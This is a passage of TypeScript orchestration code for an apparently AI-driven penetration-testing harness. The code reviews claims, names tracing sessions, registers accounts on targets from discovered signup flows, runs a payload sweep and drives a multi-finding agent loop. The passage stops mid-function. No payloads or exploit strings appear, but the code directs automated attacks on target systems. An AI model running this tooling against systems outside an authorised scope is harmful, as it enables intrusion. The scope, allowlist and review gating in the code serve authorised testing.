// the claim in the first place. That is reported honestly as oracle_verifications: 1
// (not 2, not "reproduced" text) — enough for the skill's reproduced() signal without
// asserting more than is actually true. The hunter's own invariant.statement is
// handed back as data_accessed: it IS the hunter's description of what it observed,
// and the skill's signals only check that field for presence, never its content.
const CLAIM_REVIEW_SKILL = "adversarial-self-review";

function claimReviewEnabled(env: Env): boolean {
  return boolEnv(env, "SAHW_CLAIM_REVIEW", true);
}

function buildClaimReviewInput(claim: {
  vuln_class: string; endpoint: string; control_url?: string; session?: string;
  invariant: { type: string; statement?: string; expression: string };
}): string {
  const invType = claim.invariant.type;
  const isDifferential = invType === "body_contains" || invType === "status_in";
  const methods = isDifferential ? [invType, "differential"] : [invType, "assertion"];
  const statement = typeof claim.invariant.statement === "string" ? claim.invariant.statement.trim() : "";
  const finding: Record<string, unknown> = {
    finding_id: `pending:${claim.vuln_class}:${claim.endpoint}`,
    vuln_class: claim.vuln_class,
    oracle_verifications: 1,
    methods,
    endpoint: claim.endpoint,
    control_url: claim.control_url ?? null,
  };
  if (statement) finding.data_accessed = statement;
  return JSON.stringify({ verified_findings: [finding] });
}

export interface ClaimReviewOutcome {
  verdict: "survives" | "downgraded" | "rejected" | "unavailable";
  reasoning: string;
}

/** Bounds text pulled from a skill artifact before it reaches a span or the hunter —
 * defense in depth even though adversarial-self-review's own challenge strings are
 * short, canned prose (never a response body). */
function boundedReviewText(s: string, max = 600): string {
  return s.length > max ? `${s.slice(0, max)}…` : s;
}

/**
 * Runs the mandatory claim-review pre-filter through the SAME skill_run dispatch path
 * (ToolRunner.execute) the hunter's own skill_run tool calls use — gated by the same
 * Tether allowlist/egress check, just invoked by the orchestrator instead of proposed
 * by the model. Never throws: unavailable/denied/erroring/timed-out all collapse to
 * verdict "unavailable" so the caller can fail OPEN to the Axiom exactly as if this
 * stage did not exist — a broken pre-filter must never block a verdict.
 */
async function runClaimReview(
  runner: ToolRunner,
  claim: { vuln_class: string; endpoint: string; control_url?: string; session?: string;
    invariant: { type: string; statement?: string; expression: string } },
): Promise<ClaimReviewOutcome> {
  let result;
  try {
    result = await runner.execute("skill_run", {
      skill_name: CLAIM_REVIEW_SKILL,
      input_json: buildClaimReviewInput(claim),
    });
  } catch (err) {
    return { verdict: "unavailable", reasoning: `claim-review threw: ${(err as Error)?.message ?? String(err)}` };
  }
  if (!result.ok) {
    return { verdict: "unavailable", reasoning: `claim-review unavailable (${result.kind}): ${boundedReviewText(result.denied)}` };
  }
  try {
    const output = (result.result as SkillRunOutcome).output as {
      reviews?: Array<{ verdict?: string; rejection_reason?: string | null;
        challenges?: Array<{ resolution?: string; evidence_cited?: string }> }>;
    };
    const review = output?.reviews?.[0];
    if (!review || typeof review.verdict !== "string") {
      return { verdict: "unavailable", reasoning: "claim-review returned no review entry" };
    }
    const unresolved = review.challenges?.find((c) => c.resolution === "unresolved")?.evidence_cited;
    const reasoning = boundedReviewText(
      review.rejection_reason
      ?? unresolved
      ?? review.challenges?.map((c) => c.evidence_cited).filter(Boolean).join(" | ")
      ?? "",
    );
    if (review.verdict === "rejected" || review.verdict === "downgraded" || review.verdict === "survives") {
      return { verdict: review.verdict, reasoning };
    }
    return { verdict: "unavailable", reasoning: `claim-review returned an unrecognized verdict: ${review.verdict}` };
  } catch (err) {
    return { verdict: "unavailable", reasoning: `claim-review output malformed: ${(err as Error)?.message ?? String(err)}` };
  }
}

/**
 * A run needs its own session, not the engagement's.
 *
 * sessionId was engagement.authRef, so every beat ever executed against a target
 * collapsed into ONE Langfuse session and runs could not be compared. A session
 * should be "this run", which may contain several beats.
 *
 * Shape: sahw-<host>-<YYYYMMDD-HHMMSSZ>-<runtype>-<id4>
 *   e.g. sahw-10.129.96.71-20260924-071500Z-scan-3f9a
 *
 * The name is SELF-DESCRIBING: which target, when (UTC), what KIND of run, and a
 * short stable id for uniqueness — instead of an opaque random codename. The run
 * type is read from the run id (authloop→"scan", accum→"accum-rN", smoke→"smoke",
 * htb→"htb", …). The engagement is preserved as a tag and in metadata, so filtering
 * by engagement still works.
 */
const RUN_TYPE_ALIASES: Readonly<Record<string, string>> = {
  authcont: "scan", authloop: "scan", cont: "scan", accum: "accum",
  smoke: "smoke", htb: "htb", test: "test",
};

/** A human run-type label from the run id, e.g. "authcont-1790212030" → "scan",
 * "accum-1790-r2" → "accum-r2". Falls back to the id's leading word, or "run". */
function runLabelFor(runId: string): string {
  const kind = (runId.match(/^([a-z]+)/i)?.[1] ?? "run").toLowerCase();
  const label = RUN_TYPE_ALIASES[kind] ?? kind;
  const round = runId.match(/-r(\d+)\b/i);
  return round ? `${label}-r${round[1]}` : label;
}

/** FNV-1a over any string. Well-spread, dependency-free, not secure. */
function fnv1a(s: string): number {
  let h = 0x811c9dc5;
  for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 0x01000193) >>> 0; }
  return h >>> 0;
}

/** A short, stable id (FNV-1a hex) for uniqueness across runs of the same type. */
function shortIdFor(runId: string): string {
  return fnv1a(runId).toString(16).padStart(8, "0").slice(0, 4);
}

// Memorable per-BEAT codename word-pairs — so each beat (a Langfuse trace) is easy to
// name, grep, and say out loud when comparing beats within one run.
const BEAT_ADJ = [
  "quiet", "amber", "hollow", "narrow", "brittle", "candid", "crimson", "still",
  "patient", "sudden", "civil", "blunt", "clear", "gilded", "sparse", "wary",
] as const;
const BEAT_NOUN = [
  "ledger", "vault", "teller", "transit", "mandate", "escrow", "cipher", "tally",
  "custody", "clearing", "docket", "remit", "bourse", "warrant", "assay", "drawer",
] as const;

/** A meaningful, human per-beat tag: "#<n>-<adj>-<noun>", e.g. "#3-amber-vault".
 * The word-pair is deterministic from (runId, beatNo) so a given beat always gets the
 * same memorable label. beatNo comes from the launcher (SAHW_BEAT_NO); 0 when unknown
 * (a bare single-beat CLI call), which just yields "#?-…". */
export function beatTagFor(runId: string, beatNo: number): string {
  const h = fnv1a(`${runId}#${beatNo}`);
  const tag = `${BEAT_ADJ[h % BEAT_ADJ.length]}-${BEAT_NOUN[(h >>> 8) % BEAT_NOUN.length]}`;
  return `#${beatNo > 0 ? beatNo : "?"}-${tag}`;
}

export function buildRunSession(opts: {
  scope: URL[]; runId: string; now: Date; override?: string;
}): { sessionId: string; runId: string; codename: string; startedUtc: string } {
  // The session id must be STABLE across every beat of one run, or each beat lands
  // in its own ~8-minute Langfuse session and the run cannot be watched as a single
  // timeline. The bug: the timestamp below was taken from `now` (the per-beat start),
  // so a 20-beat run fragmented into 20 sessions that only shared a codename. The fix:
  // derive the timestamp from the RUN itself — the epoch embedded in the run id
  // (authloop sets SAHW_RUN_ID=authcont-<epoch>, identical for every beat) — so all
  // beats collapse into one session. codename and tail were already run-stable.
  const epoch = opts.runId.match(/(\d{9,13})/);
  const runStart = epoch
    ? new Date(Number(epoch[1]) * (epoch[1].length <= 10 ? 1000 : 1))
    : opts.now;                                           // no epoch in the id -> best effort
  const t = runStart.toISOString();                       // 2026-09-22T08:07:15.123Z (RUN start)
  const stamp = `${t.slice(0, 10).replace(/-/g, "")}-${t.slice(11, 19).replace(/:/g, "")}Z`;
  const host = opts.scope[0]?.hostname ?? "unknown-target";
  // Meaningful, self-describing label: the run TYPE (scan/accum/smoke/htb/…) read
  // from the run id, plus a short stable id for uniqueness — replaces the old opaque
  // random codename. `codename` is kept as the field name for downstream callers
  // (traceName/metadata), but now carries the readable "<type>-<id4>" label.
  const codename = `${runLabelFor(opts.runId)}-${shortIdFor(opts.runId)}`;
  return {
    sessionId: opts.override?.trim() || `sahw-${host}-${stamp}-${codename}`,
    runId: opts.runId,
    codename,
    // The BEAT's own start time (per-beat), used for the beat record — distinct from
    // the run-stable timestamp baked into sessionId above.
    startedUtc: opts.now.toISOString(),
  };
}

// ---- Spine-facing helpers --------------------------------------------------------

/** A captured exchange (an exploit or control probe), reduced to what the Spine's
 * attack_surface records — status and content-type, never the body. */
function toSpineEndpoint(capture: HttpCapture): SpineEndpoint {
  return {
    url: capture.request.url,
    method: capture.request.method,
    status: capture.response.status,
    content_type: headerValueCI(capture.response.headers, "content-type"),
  };
}

function headerValueCI(headers: Record<string, string> | undefined | null, name: string): string | null {
  if (!headers) return null;
  const lower = name.toLowerCase();
  for (const [k, v] of Object.entries(headers)) {
    if (k.toLowerCase() === lower) return v;
  }
  return null;
}

/**
 * A model claim may attach an optional "intel" object of durable recon facts (see
 * <output_contract> in src/brief.ts) — deterministic code decides whether to keep
 * it: only string/boolean VALUES are accepted, nothing nested, so a malformed or
 * hostile shape simply drops rather than corrupting the spine. Secret-looking
 * values are still stripped later, in spine.ts's updateSpine — this is not the only
 * guard.
 */
function extractIntel(claim: unknown): RecoveredIntel | null {
  const raw = (claim as { intel?: unknown } | null)?.intel;
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return null;
  const out: RecoveredIntel = {};
  for (const [k, v] of Object.entries(raw as Record<string, unknown>)) {
    if (typeof v === "string" || typeof v === "boolean") out[k] = v;
  }
  return Object.keys(out).length > 0 ? out : null;
}

/**
 * A cheap, generic fallback signal for recovered_intel, derived purely from
 * endpoints actually observed this run — never a literal. A model-reported
 * "intel" object (see extractIntel) is more specific and always wins on conflict;
 * this only fills gaps a claim never mentioned.
 */
function inferRecoveredIntel(scopeOrigins: string[], endpoints: SpineEndpoint[]): RecoveredIntel {
  const intel: RecoveredIntel = {};
  const foreignOrigins = new Set<string>();
  let sourceMapsSeen = false;
  for (const ep of endpoints) {
    try {
      const origin = new URL(ep.url).origin;
      if (!scopeOrigins.includes(origin)) foreignOrigins.add(origin);
    } catch {
      // Unparseable URL — nothing to infer from it.
    }
    if (/\.map(\?|$)/.test(ep.url)) sourceMapsSeen = true;
  }
  if (foreignOrigins.size > 0) intel.api_base = [...foreignOrigins].sort().join(", ");
  if (sourceMapsSeen) intel.source_maps_seen = true;
  return intel;
}

// ---- Registration phase: "make it a beat PHASE, not an optional tool" ----------
//
// OBSERVED PROBLEM this section exists to fix: across real host beats,
// register_account was never called — accounts=0 in the spine every time — so
// every authenticated finding (idor, change-password, negative-transfer
// business_logic, jwt, otp, ...) was structurally unreachable. Describing the
// capability in the brief's <tool_guidance> was not enough (same lesson as
// skill_run before it): a capability the loop should reliably use belongs in the
// FLOW, not just the toolbox. See AUTHENTICATED_VULN_CLASSES in brief.ts for the
// (security-domain, non-benchmark) judgment of which classes need a session.

const SIGNUP_FLOW_INTEL_KEYS = [
  "signup_url", "signup_method", "signup_body_template", "signup_response_token_path",
  "login_url", "login_method", "login_body_template", "login_id_from_signup_path",
  "login_response_token_path", "auth_header_name",
] as const;

type SignupFlowArgs = Record<(typeof SIGNUP_FLOW_INTEL_KEYS)[number], string>;

/**
 * Reads register_account's own required inputs back out of recovered_intel, under
 * the SAME generic key names register_account's tool schema already uses
 * (tools.ts) — never a target-specific literal hardcoded here; every value, if
 * present at all, arrived at runtime from a PRIOR beat's own discovery (see
 * brief.ts's <account_objective>, which tells the hunter to attach these exact
 * keys). Returns null when the flow has not been discovered yet — the minimum
 * bar is register_account's own contract (tools.ts: signup_url and
 * auth_header_name are required, and a body template that cannot fill/parse
 * throws invalid_argument there anyway), so anything short of that is "not yet
 * known", not a malformed call worth attempting.
 */
function discoveredSignupFlow(intel: RecoveredIntel): SignupFlowArgs | null {
  const str = (k: string): string => {
    const v = (intel as Record<string, unknown>)[k];
    return typeof v === "string" ? v.trim() : "";
  };
  const signup_url = str("signup_url");
  const signup_body_template = str("signup_body_template");
  const auth_header_name = str("auth_header_name");
  if (!signup_url || !signup_body_template || !auth_header_name) return null;
  return {
    signup_url,
    signup_method: str("signup_method") || "POST",
    signup_body_template,
    signup_response_token_path: str("signup_response_token_path"),
    login_url: str("login_url"),
    login_method: str("login_method") || "POST",
    login_body_template: str("login_body_template"),
    login_id_from_signup_path: str("login_id_from_signup_path"),
    login_response_token_path: str("login_response_token_path"),
    auth_header_name,
  };
}

/**
 * THE DETERMINISTIC HALF of the registration phase. Runs ONCE, before the hunter
 * ever sees a system prompt this beat, using ONLY what a PRIOR beat already
 * recorded in the spine. Three ways it can end:
 *   - already have >=2 accounts, or no open vuln_class needs one: no-op (the
 *     trigger conditions below are the ONLY gate — see the task's brief).
 *   - the signup/login flow is already known (discoveredSignupFlow found it):
 *     call register_account directly through the SAME Tether-gated ToolRunner
 *     path the hunter itself would use, up to 2 accounts, stopping at the first
 *     denial/failure — never retried blindly (a policy denial or a cap hit will
 *     fail identically on a retry; see tools.ts's ToolFailureKind doc).
 *   - the flow is NOT yet known: nothing is called here. Forcing a BLIND
 *     registration is impossible by construction — register_account's own
 *     contract requires a discovered signup_url/envelope/token-path (tools.ts).
 *     brief.ts's <account_objective> directive carries the load instead, making
 *     discovery + registration this beat's primary objective for the model to
 *     pursue itself, through recon + register_account.
 * Never throws: a register_account failure here is exactly as legitimate an
 * outcome as the hunter's own attempt failing, and must not abort the beat.
 */
async function runRegistrationPhase(runner: ToolRunner, spine: Spine): Promise<void> {
  // "Done" is measured in USABLE sessions (has_auth_material), not raw account
  // rows: an account created on the target with NO token recovered
  // (has_auth_material=false) is worthless for every authenticated finding, so it
  // must not satisfy the objective nor block another attempt. A prior beat that
  // registered a tokenless account therefore still re-enters this phase.
  const usable = (metas: { has_auth_material: boolean }[]): number =>
    metas.filter((m) => m.has_auth_material).length;
  // Do NOT gate on spine.sessions: that is cross-beat METADATA (label +
  // has_auth_material), never a live token — auth material lives only in-process for
  // the beat that minted it (session.ts), so at the start of THIS beat the runner's
  // SessionStore is always empty regardless of how many "usable" sessions the spine
  // records. Gating on stale spine metadata was making a beat skip re-registration
  // and then try to use a session label with no token behind it. The only thing
  // worth persisting across beats is the RECIPE (recovered_intel), which lets this
  // phase mint FRESH live tokens here, every beat, at zero model cost.
  if (openAuthenticatedClasses(spine.proved).length === 0) return;
  const flow = discoveredSignupFlow(spine.recovered_intel);
  if (!flow) return;
  // Replay the KNOWN-GOOD flow deterministically up to the account cap. This half
  // cannot self-correct a rejected envelope (it has no model) — envelope iteration
  // is the hunter's job via register_account's own rejection feedback (see
  // tools.ts). So stop as soon as SAHW_MAX_ACCOUNTS is hit OR a call throws, and
  // stop early once we hold 2 USABLE sessions; a call that returns a tokenless
  // account (result.ok but obtained_auth_material=false) means this flow no longer
  // yields a token, so there is nothing to gain by repeating it — hand off to the
  // hunter rather than burn the account cap on identical tokenless registrations.
  for (let i = 0; i < 2; i++) {
    if (usable(runner.getSessionMeta()) >= 2) break;
    if (runner.getSessionMeta().length >= 2) break;
    let result;
    try {
      result = await runner.execute("register_account", { ...flow });
    } catch {
      break;
    }
    if (!result.ok) break;
    const obtained = (result.result as { obtained_auth_material?: boolean })?.obtained_auth_material;
    if (obtained !== true) break;
  }
}

export async function runBeat(opts: {
  env: Record<string, string | undefined>;
  client: MinimalClient;
  fetchImpl?: typeof fetch;
  /** Overrides node:child_process's real `spawn` for skill_run (including the
   * mandatory claim-review call below). Mirrors fetchImpl — production omits it and
   * gets the real `spawn`; tests use it to inject a fixture skill or spy on call
   * order (see ToolRunner's own spawnImpl in tools.ts). */
  spawnImpl?: typeof spawn;
  now?: Date;
  /** Overrides the default (real, bounded, direct-connect) TLS-reachability prober
   * used by a `derived`/tls_unavailable claim (see resolveDerivedInput below).
   * Production omits it; tests inject a fake one so they never touch the network. */
  tlsProber?: TlsProber;
  /** Overrides ToolRunner's default fresh SessionStore. Mirrors fetchImpl/spawnImpl —
   * production omits it; tests pass a pre-seeded store so a claim's `session` label
   * (see capture()/runSteps() below) resolves to real, injectable auth material
   * without going through a live register_account call first. */
  sessionStore?: SessionStore;
}): Promise<BeatResult> {
  const engagement = loadEngagement(opts.env, opts.now);   // throws outside the window — MUST run
                                                            // before any span opens (see below)
  const stallCfg = loadStallConfig(opts.env);
  // initObservability() registers the Langfuse OpenTelemetry tracer provider (when
  // configured) BEFORE the "beat" span below is opened. That ordering is load-bearing:
  // opening a span before a provider is registered gets a no-op span, and
  // obs.traceId() (which reads getActiveTraceId() live) would then report no id even
  // though Langfuse IS configured.
  const obs = await initObservability(opts.env);
  const sandboxId = randomUUID();

  const workspace = opts.env.SAHW_WORKSPACE ?? ".";
  const store = new ArtifactStore(join(workspace, "artifacts"));
  const skillAllowlist = allowlistFor(engagement.deep);
  const runner = new ToolRunner({
    engagement, store, fetchImpl: opts.fetchImpl, spawnImpl: opts.spawnImpl,
    skillAllowlist,
    // Both fall back to ToolRunner's own defaults (the repo's skills/ dir, 120s) when
    // unset — this only lets an env override reach the runner the same way
    // SAHW_SKILLS_ROOT / SAHW_SKILL_TIMEOUT_MS already do at the module level in
    // tools.ts, but scoped to THIS beat's env object rather than process.env, so tests
    // can point at a fixture skill directory without touching global state.
    skillsRoot: opts.env.SAHW_SKILLS_ROOT?.trim() || undefined,
    skillTimeoutMs: numEnv(opts.env, "SAHW_SKILL_TIMEOUT_MS", 120_000),
    sessionStore: opts.sessionStore,
  });
  const hunterTools = [...TOOL_SCHEMAS, buildSkillRunTool(skillAllowlist)];

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), engagement.phaseTimeoutMs);
  const scopeUrls = engagement.scope.map((u) => u.toString());
  const scopeOrigins = engagement.scope.map((u) => u.origin);

  const maxFindings = Math.max(1, numEnv(opts.env, "SAHW_MAX_FINDINGS", 12));
  const maxTurnsPerFinding = Math.max(1, numEnv(opts.env, "SAHW_MAX_TURNS_PER_FINDING", 8));

  // THE SPINE. Read first, written last, every beat — see src/spine.ts. A missing,
  // corrupt, or engagement/scope-mismatched spine degrades to a fresh one (logged
  // and recorded, never thrown); a schema_version newer than this build understands
  // is refused outright and legitimately throws here, before any span opens — the
  // same posture as loadEngagement above.
  const spineLoad = await loadSpine({ workspace, authRef: engagement.authRef, scopeOrigins });

  // Registration phase (deterministic half) — runs BEFORE the brief is built so
  // the brief always reflects POST-registration state this beat, never the
  // spine's stale pre-registration account count. See runRegistrationPhase's own
  // doc comment above for the full trigger/outcome contract.
  await runRegistrationPhase(runner, spineLoad.spine);
  // USABLE sessions (token obtained), not raw account rows — a tokenless account
  // proves no authenticated finding, so the brief must still treat registration as
  // this beat's priority until at least one session actually carries auth material
  // (see renderAccountObjective and runRegistrationPhase's own "usable" gate).
  const sessionsThisBeat = runner.getSessionMeta().filter((m) => m.has_auth_material).length;

  // GENERATED FROM STATE, AS XML. Built once, from the spine as loaded — the
  // conversation's system message is only set on the FIRST runAgent call of the
  // beat (see agent.ts: system/user are ignored once `messages` is supplied), so
  // regenerating it mid-beat would never reach the model anyway. What THIS beat
  // itself discovers is folded into the spine at the end, for the NEXT beat.
  const briefState = {
    attackSurface: spineLoad.spine.attack_surface,
    recoveredIntel: spineLoad.spine.recovered_intel,
    proved: spineLoad.spine.proved,
    attempted: spineLoad.spine.attempted,
    turnsRemaining: engagement.maxTurns,
    findingsRemaining: maxFindings,
    sessionsCount: sessionsThisBeat,
  };
  const hunterBrief = buildHunterBrief(briefState);
  // The SAME origins the brief relativized against, so a relative endpoint the model
  // emits (because the brief showed it URLs relative to <target>) resolves back to the
  // exact absolute in-scope URL. Computed from the identical state → consistent per beat.
  const briefOrigins = deriveOrigins(briefState);

  // DEEP-MODE SWEEP PRE-PASS (off by default). Deterministically fires every payload
  // class at every discovered input (JSON body leaves + query params, derived from the
  // framework's OWN captured requests — no DB/answer-key), judged by the pure fuzz
  // oracle. Strong hits become a high-priority brief directive the hunter submits first;
  // the Axiom still decides, and canonicalizeEndpoint records the win on the canonical
  // route. Fails soft — any error yields no leads and the normal loop proceeds.
  // Run the sweep ONCE per run — on the first beat only. Its strong hits are banked into
  // the spine's proved set, so re-sweeping every beat would just re-spend the budget and
  // starve the LLM loop (observed: beats stalling at 0 findings). beatNo<=1 (or unknown)
  // = first beat. Later beats inherit the banked findings via the spine.
  let sweepLeads = "";
  let sweepProved: ProvedEntry[] = [];
  const sweepBeatNo = Math.max(0, Math.trunc(numEnv(opts.env, "SAHW_BEAT_NO", 1)));
  if (engagement.deep.enabled && sweepBeatNo <= 1) {
    const sw = await runDeepSweep({
      runner, workspace, scopeOrigins, canon: canonicalizeEndpoint,
      budget: engagement.deep.maxSweepRequests, obs, engagementId: engagement.authRef,
    });
    sweepLeads = sw.leads;
    sweepProved = sw.proved;
  }

  try {
    // One Langfuse trace per beat; one SESSION per run, so runs are comparable.
    // The engagement stays discoverable via the tag and metadata below.
    const session = buildRunSession({
      scope: engagement.scope,
      // SAHW_RUN_ID groups several beats of one run into a single session.
      // Unset, each beat is its own run — which is the case for a single CLI call.
      runId: opts.env.SAHW_RUN_ID?.trim() || sandboxId,
      now: opts.now ?? new Date(),
      override: opts.env.SAHW_SESSION_ID,
    });
    // Per-beat identifier so each trace in a run is distinguishable at a glance:
    // "#<n>-<adj>-<noun>" (beat number from the launcher's SAHW_BEAT_NO). The trace
    // name becomes e.g. "sahw-beat #3-amber-vault · htb-3f9a".
    const beatNo = Math.max(0, Math.trunc(numEnv(opts.env, "SAHW_BEAT_NO", 0)));
    const beatTag = beatTagFor(session.runId, beatNo);
    return await startActiveObservation("beat", async (span) => {
      return await propagateAttributes({
        traceName: `sahw-beat ${beatTag} · ${session.codename}`,
        sessionId: session.sessionId,
        userId: opts.env.LANGFUSE_USER_ID ?? "sahw",
        tags: [engagement.profile, "m0", `engagement:${engagement.authRef}`, `beat:${beatTag}`],
        metadata: {
          scope: scopeUrls.join(","),
          sandboxId,
          engagement: engagement.authRef,
          run_codename: session.codename,
          beat_no: beatNo > 0 ? String(beatNo) : "unknown",
          beat_tag: beatTag,
          run_started_utc: session.startedUtc,
          spine_fresh: String(spineLoad.fresh),
        },
      }, async () => {
        const result = await hunt();
        // setTraceIO is deprecated in @langfuse/tracing v5 but remains the only
        // trace-level input/output path; trace-level userId/sessionId/tags/metadata
        // go through propagateAttributes above instead.
        span.setTraceIO({
          input: scopeUrls,
          output: {
            findingsCount: result.findings.length,
            verdicts: result.findings.map((f) => f.verdict),
            stalled: result.stalled,
            reason: result.reason,
            duplicatesSuppressed: result.duplicates_suppressed,
            alreadyProvedSuppressed: result.already_proved_suppressed,
            rejectedClaims: result.rejected_claims.length,
          },
        });
        return result;
      });

      /**
       * The multi-finding loop. Each iteration is ONE finding attempt: continue (or
       * start) the hunter conversation, get at most one claim out of it, verify it
       * (unless it's rejected or a duplicate), bank it immediately, then feed the
       * outcome back as the next user turn and loop. Budgets are SHARED across the
       * whole beat (engagement.maxTurns / engagement.budgetTokens), tracked
       * cumulatively here; maxTurnsPerFinding caps any single attempt so one greedy
       * hypothesis cannot consume the whole beat's turn budget.
       */
      async function hunt(): Promise<BeatResult> {
        const findings: FindingRowWithCause[] = [];
        const seen = new Set<string>();               // `${vuln_class}::${endpoint}`
        let duplicatesSuppressed = 0;
        // Every vuln_class already CONFIRMED anywhere in this engagement — seeded from
        // the spine's prior beats, then grown as THIS beat itself confirms classes (see
        // the provedEntries.push() site below) — so a second CONFIRMED hit on the SAME
        // class later in this same beat is caught too, not just across beats.
        // Keyed on (class, endpoint), NOT class alone: the benchmark scores each
        // (vuln_class, endpoint, invariant) finding separately, and several classes
        // legitimately have MULTIPLE findings on distinct endpoints (e.g. rate-limit
        // absence at login vs signup vs OTP; auth_bypass at the reset chain vs the
        // change-password endpoint). Suppressing every re-use of a proved CLASS made
        // those extra findings structurally unreachable. We still suppress an exact
        // (class, endpoint) re-proof — that IS pure waste — but a proved class on a
        // NEW endpoint is now allowed through to the Axiom, which still requires a
        // genuine proof, so this can never manufacture a finding that isn't real.
        // (class::endpoint) -> the STRONGEST invariant already banked for it. A Map (was a
        // Set) so the dedupe can let a legitimate invariant UPGRADE (weak partial ->
        // strong) back through while still suppressing a bare duplicate.
        const provedByEndpoint = new Map<string, string>();
        for (const p of spineLoad.spine.proved) {
          const k = `${p.vuln_class}::${p.endpoint}`;
          const prev = provedByEndpoint.get(k);
          if (prev === undefined || isInvariantUpgrade(p.vuln_class, prev, p.invariant_type)) {
            provedByEndpoint.set(k, p.invariant_type);
          }
        }
        let alreadyProvedSuppressed = 0;
        const rejectedClaims: RejectedClaim[] = [];
        const failureCauses = emptyFailureCauses();
        const reviewEnabled = claimReviewEnabled(opts.env);

        // What THIS beat learns, folded into the spine at every exit — including a
        // stall or a failure. This is the whole point: a beat that learned "this
        // endpoint answers uniformly to every probe" is a beat whose lesson must
        // survive.
        const discoveredEndpoints: SpineEndpoint[] = [];
        const provedEntries: ProvedEntry[] = [];
        const attemptedEntries: AttemptedEntry[] = [];
        let recoveredIntelFromClaims: RecoveredIntel = {};
        const beatStartedUtc = new Date().toISOString();

        let messages: any[] | undefined = undefined;  // undefined until the first runAgent call
        let totalTurns = 0;
        let totalTokens = 0;
        // Stall is a BEAT-level rule, not an attempt-level one. A beat that already
        // executed real work is not stalled just because one later hypothesis ran dry —
        // that attempt simply ends, as it does for max_turns. Scoping the check to a
        // single attempt aborted a beat that had already mapped 5 endpoints including
        // the API root, discarding every bit of it.
        let beatSucceededToolCalls = 0;
        let beatArtifacts = 0;
        const beatCalls: Array<{ tool: string; args: string }> = [];

        /** Builds this beat's contribution to the spine and saves it. Never throws —
         * a save failure is logged and swallowed, exactly like a corrupt read: the
         * beat's own result must not be lost because the workspace disk hiccuped. */
        async function persistSpine(stalled: boolean, reason: string | null): Promise<void> {
          const beatRecord: SpineBeatRecord = {
            beat_id: sandboxId,
            started_utc: beatStartedUtc,
            ended_utc: new Date().toISOString(),
            findings_banked: findings.length,
            stalled,
            reason,
            codename: session.codename,
          };
          const inferred = inferRecoveredIntel(
            scopeOrigins, [...spineLoad.spine.attack_surface, ...discoveredEndpoints]);
          // The known-good registration envelope (non-secret shape only), if a beat
          // obtained a token. Persisting it under recovered_intel's structured keys is
          // what lets the NEXT beat's deterministic registration phase
          // (discoveredSignupFlow -> runRegistrationPhase) re-register instantly, so
          // the hunter spends its whole budget on findings instead of re-deriving
          // signup+login from scratch every beat. Placed AFTER claim intel so a fresh
          // successful recipe always wins over any stale prose the claims carried.
          const registrationRecipe = runner.getSuccessfulRegistrationRecipe() ?? {};
          const nextSpine = updateSpine(spineLoad.spine, {
            beat: beatRecord,
            discoveredEndpoints,
            recoveredIntel: { ...inferred, ...recoveredIntelFromClaims, ...registrationRecipe },
            proved: [...provedEntries, ...sweepProved],
            attempted: attemptedEntries,
            // Persist account LABELS + non-secret metadata (no token, no password —
            // getSessionMeta/SessionMeta carry neither) so a later beat's hunter knows
            // accounts A/B already exist and does not re-register them.
            sessions: runner.getSessionMeta(),
          });
          try {
            await saveSpine(workspace, nextSpine);
          } catch (err) {
            console.error(`[spine] failed to save progress.json (continuing): ${(err as Error).message}`);
          }
        }

        const bail = async (exitCode: number, stalled: boolean, reason: string | null): Promise<BeatResult> => {
          await persistSpine(stalled, reason);
          return {
            exitCode, findings, stalled, reason,
            duplicates_suppressed: duplicatesSuppressed,
            already_proved_suppressed: alreadyProvedSuppressed,
            rejected_claims: rejectedClaims,
            failure_causes: failureCauses,
            spine_fresh: spineLoad.fresh,
            spine_fresh_reason: spineLoad.freshReason,
          };
        };

        try {
          return await loop();
        } catch (err) {
          // An unexpected throw (not one of the documented stop conditions below,
          // which all go through `bail`) must still leave a trace in the spine —
          // "write the spine even when the beat stalls or FAILS". Save, then
          // rethrow: this does not swallow the failure, it just makes sure the
          // failure itself is not silently lossy.
          await persistSpine(true, `beat failed: ${(err as Error)?.message ?? String(err)}`);
          throw err;
        }

        async function loop(): Promise<BeatResult> {
        while (true) {
          if (findings.length >= maxFindings) {
            return await bail(0, false, `max findings cap (${maxFindings}) reached`);
          }
          if (controller.signal.aborted) {
            return await bail(0, false, findings.length ? null : "aborted before any finding was banked");
          }
          const remainingTurns = engagement.maxTurns - totalTurns;
          if (remainingTurns <= 0) {
            return await bail(0, false, findings.length ? null : "turn budget exhausted before any finding was banked");
          }
          const remainingTokens = engagement.budgetTokens - totalTokens;
          if (remainingTokens <= 0) {
            return await bail(0, false, findings.length ? null : "token budget exhausted before any finding was banked");
          }

          // Everything in `messages` before this call is prior conversation, not new
          // this attempt. First call builds system+user internally (length 2).
          const priorLen = messages ? messages.length : 2;
          const perCallMaxTurns = Math.min(maxTurnsPerFinding, remainingTurns);

          const run = await runAgent({
            client: opts.client,
            model: opts.env.SAHW_MODEL ?? "model",
            system: hunterBrief,
            user: sweepLeads
              ? `In-scope: ${scopeUrls.join(", ")}\n\n${sweepLeads}`
              : `In-scope: ${scopeUrls.join(", ")}`,
            tools: hunterTools,
            runner,
            maxTurns: perCallMaxTurns,
            budgetTokens: remainingTokens,
            // Force a commit if the model burns most of an attempt exploring without
            // submitting. Default: ~60% of this attempt's turn budget (min 4), tunable
            // via SAHW_NUDGE_TURNS. This is what converts over-long recon (shell/source
            // grepping) into an actual proof attempt.
            nudgeAfterTurns: Math.max(4, numEnv(opts.env, "SAHW_NUDGE_TURNS", Math.ceil(perCallMaxTurns * 0.6))),
            signal: controller.signal,
            messages,
          });

          totalTurns += run.turns;
          totalTokens += run.tokens;
          messages = run.messages;

          // Every endpoint the hunter actually touched this attempt, metadata-only
          // (status + content-type, never a body) — feeds the Spine's attack_surface
          // so a LATER beat inherits the map instead of re-deriving it.
          for (const hc of run.httpCalls) {
            discoveredEndpoints.push({
              url: hc.url, method: hc.method, status: hc.status, content_type: hc.contentType,
            });
          }

          beatSucceededToolCalls += run.toolCalls.filter((c) => c.ok).length;
          beatArtifacts += run.artifacts;
          for (const c of run.toolCalls) beatCalls.push({ tool: c.tool, args: c.args });

          const succeededToolCalls = beatSucceededToolCalls;
          const repeatCounts = new Map<string, number>();
          for (const c of beatCalls) {
            const key = `${c.tool}:${c.args}`;
            repeatCounts.set(key, (repeatCounts.get(key) ?? 0) + 1);
          }

          const stall = await startActiveObservation("stall-check", async (stallSpan) => {
            stallSpan.update({
              input: {
